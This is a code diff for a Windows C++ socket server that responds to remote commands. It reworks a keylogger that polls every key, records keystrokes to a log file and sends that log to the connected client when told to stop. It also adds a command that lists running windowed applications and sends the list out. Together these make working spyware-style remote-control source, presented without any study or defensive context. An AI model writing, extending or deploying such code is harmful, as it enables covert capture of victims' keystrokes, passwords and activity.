@@ -227,7 +227,11 @@ void Server::handleClient(SOCKET clientSocket) {
                 std::cout << "Keylogger stop command received." << std::endl;
                 stopKeyLogger(clientSocket);
                 break;
-            } 
+            } else if (receivedMessage == "listApp"){
+                std::cout << "List app command received." << std::endl;
+                ListApplications(clientSocket);
+                break;
+            }
             // else if (receivedMessage == "screenshot") {
             //     std::cout << "Screenshot command received. Taking a screenshot..." << std::endl;
             //     takeScreenshot("screenshot.png");
@@ -338,111 +342,106 @@ void Server::restartServer(){
 }
 
 
-// Check if a key is currently pressed
-
-
-// Function to start keylogger
-
-
-
+//Keylogger
 void Server::startKeyLogger() {
     isLogging = true;
-    if (!keyLoggerThread.joinable()) {
+    if (!keyLoggerThread.joinable()) 
         keyLoggerThread = std::thread(&Server::keyLogger, this);
-        std::cout << "Keylogger started in a new thread.\n";  // Debug line
-    } else {
-        std::cout << "Keylogger thread is already running.\n";  // Debug line
-    }
+        std::cout << "Keylogger started.\n";
 }
 // Function to stop keylogger and send log file to client
 void Server::stopKeyLogger(SOCKET clientSocket) {
     isLogging = false;
-    std::cout << "Setting isLogging to false to stop keylogger.\n";
-
-    if (keyLoggerThread.joinable()) {
-        keyLoggerThread.join();
-    } else {
-        std::cerr << "Keylogger thread was not joinable.\n";
-    }
+    if (keyLoggerThread.joinable()) 
+        keyLoggerThread.join();   
+    copyFileAndSend(clientSocket, "log.txt", "log.txt");
     
-    // Send the log file to the client after stopping
-    copyFileAndSend(clientSocket, logFilePath, logFilePath);
 }
 
-// Main keylogger function
 void Server::keyLogger() {
-    // FreeConsole();
-   
-    FILE* OUTPUT_FILE = fopen(logFilePath.c_str(), "a+");
-      if (OUTPUT_FILE == nullptr) {
-        std::cerr << "Failed to open log file.\n";  // Debug line
+    std::ofstream outputFile("log.txt", std::ios::app);  // Open file in append mode
+    if (!outputFile.is_open()) {
+        std::cerr << "Failed to open log file for writing.\n";
         return;
     }
 
+    std::map<int, std::string> keyMap = {
+        {VK_BACK, "[BACKSPACE]"},
+        {VK_RETURN, "[ENTER]"},
+        {VK_TAB, "[TAB]"},
+        {VK_ESCAPE, "[ESCAPE]"},
+        {VK_CONTROL, "[CTRL]"},
+        {VK_MENU, "[ALT]"},
+        {VK_SPACE, "[SPACE]"},
+        {VK_CAPITAL, "[CAPSLOCK]"},
+        {VK_SHIFT, "[SHIFT]"}
+    };
+
     while (isLogging) {
         Sleep(10);
-        std::cout << "Logging active...\n"; // Debug output to confirm loop entry
         for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                 std::lock_guard<std::mutex> lock(logMutex);
-
-                // Handle special keys (Shift, Backspace, etc.)
-                switch (i) {
-                    case VK_SHIFT: 
-                        fprintf(OUTPUT_FILE, "[SHIFT]"); 
-                        break;
-                    case VK_BACK: 
-                        fprintf(OUTPUT_FILE, "[BACKSPACE]"); 
-                        break;
-                    case VK_RETURN: 
-                        fprintf(OUTPUT_FILE, "[ENTER]"); 
-                        break;
-                    case VK_TAB: 
-                        fprintf(OUTPUT_FILE, "[TAB]"); 
-                        break;
-                    case VK_ESCAPE: 
-                        fprintf(OUTPUT_FILE, "[ESCAPE]"); 
-                        break;
-                    case VK_CONTROL: 
-                        fprintf(OUTPUT_FILE, "[CTRL]"); 
-                        break;
-                    case VK_MENU: 
-                        fprintf(OUTPUT_FILE, "[ALT]"); 
-                        break;
-                    case VK_SPACE: 
-                        fprintf(OUTPUT_FILE, "[SPACE]"); 
-                        break;
-                    case VK_CAPITAL: 
-                        fprintf(OUTPUT_FILE, "[CAPSLOCK]"); 
-                        break;
-                    default:
-                        // Handle printable characters
-                        if ((i >= 'A' && i <= 'Z') || (i >= 'a' && i <= 'z') || (i >= '0' && i <= '9') || 
-                            (i == '!' || i == '@' || i == '#' || i == '$' || i == '%' || i == '^' || 
-                            i == '&' || i == '*' || i == '(' || i == ')' || i == '-' || i == '+' || 
-                            i == '=' || i == '[' || i == ']' || i == '{' || i == '}' || i == '\\' || 
-                            i == ';' || i == '\'' || i == ',' || i == '.' || i == '/' || i == '?' || 
-                            i == '<' || i == '>' || i == ':' || i == '"' || i == '`' || i == '~')) {
-                            // Check if CapsLock is active or Shift is pressed
-                            bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-                            bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-
-                            // Determine if the key should be uppercase or lowercase
-                            if ((isCapsLockOn || isShiftPressed) && (i >= 'a' && i <= 'z')) {
-                                // Convert lowercase to uppercase
-                                fprintf(OUTPUT_FILE, "%c", i - 32);  // To uppercase (ASCII trick)
-                            } else {
-                                fprintf(OUTPUT_FILE, "%c", i);
-                            }
+                // Check if the key is in the special key map
+                auto it = keyMap.find(i);
+                if (it != keyMap.end()) {
+                    outputFile << it->second;  //Dpecial keys
+                } else {
+                    if ((i >= 0x30 && i <= 0x39) ||    // Numbers 0-9
+                            (i >= 0x41 && i <= 0x5A)) {  // Letters A-Z and a-z
+                            outputFile << static_cast<char>(i);
                         }
                         break;
                 }
-                fflush(OUTPUT_FILE);
+                outputFile.flush();  // Flush after each keystroke
             }
         }
     }
-    std::cout << "Logging stopped.\n"; // Indicates that logging stopped properly
-    fclose(OUTPUT_FILE);
+    outputFile.close();  
 }
 
+
+bool Server::hasVisibleWindow(DWORD processID) {
+    HWND hwnd = GetTopWindow(NULL);
+    while (hwnd) {
+        DWORD windowProcessID;
+        GetWindowThreadProcessId(hwnd, &windowProcessID);
+        if (windowProcessID == processID && IsWindowVisible(hwnd)) {
+            return true;
+        }
+        hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
+    }
+    return false;
+}
+
+void Server::ListApplications(SOCKET clientSocket) {
+    HANDLE hProcessSnap;
+    PROCESSENTRY32 pe32;
+    std::ofstream outfile("applications.txt");
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to take a snapshot of the processes." << std::endl;
+        return;
+    }
+
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (!Process32First(hProcessSnap, &pe32)) {
+        std::cerr << "Failed to retrieve information for the first process." << std::endl;
+        CloseHandle(hProcessSnap);
+        return;
+    }
+
+    do {
+        if (hasVisibleWindow(pe32.th32ProcessID)) {
+            outfile << "Application Name: " << pe32.szExeFile << "\n";
+            outfile << "Process ID: " << pe32.th32ProcessID << "\n\n";
+        }
+    } while (Process32Next(hProcessSnap, &pe32));
+
+    CloseHandle(hProcessSnap);
+    outfile.close();
+    copyFileAndSend(clientSocket, "applications.txt", "applications.txt");
+}
 
